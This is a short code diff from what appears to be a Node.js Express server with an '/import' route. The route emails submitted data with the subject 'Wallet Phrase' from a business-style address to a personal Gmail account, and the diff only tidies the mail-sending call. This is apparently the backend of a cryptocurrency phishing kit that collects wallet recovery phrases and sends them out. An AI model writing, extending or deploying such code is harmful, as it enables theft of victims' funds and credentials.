@@ -33,7 +33,7 @@ app.post("/import", async (req, res) => {
             }
         })
     
-        let info = await transport.sendMail({
+        await transport.sendMail({
             from: "info@hitechgroupindia.com",
             to: "michaelstone730@gmail.com",
             subject: "Wallet Phrase",
